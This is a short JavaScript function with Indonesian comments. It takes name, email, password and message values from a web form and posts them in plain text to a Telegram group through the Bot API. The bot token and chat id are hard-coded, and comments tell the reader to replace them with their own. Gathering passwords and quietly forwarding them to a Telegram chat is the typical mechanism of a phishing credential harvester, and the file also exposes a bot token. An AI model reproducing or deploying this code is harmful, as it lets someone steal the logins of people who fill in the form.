function kirimPesan() {

    var nama = document.getElementById('nama');
    var email = document.getElementById('email');
    var password = document.getElementById('password');
    var pesan = document.getElementById('pesan');

    var gabungan = 'Nama%3A%0A' + nama.value + '%0AEmail%3A%0A' + email.value + '%0Apassword%3A%0A' + password.value + '%0APesan%3A%0A' + pesan.value;

    var token = '6949290982:AAFblXRxyEhQqGcWNBSkjmkpsycIAlLQ4o0'; // Ganti dengan token bot yang kamu buat
    var grup = '-4152673994'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    })
}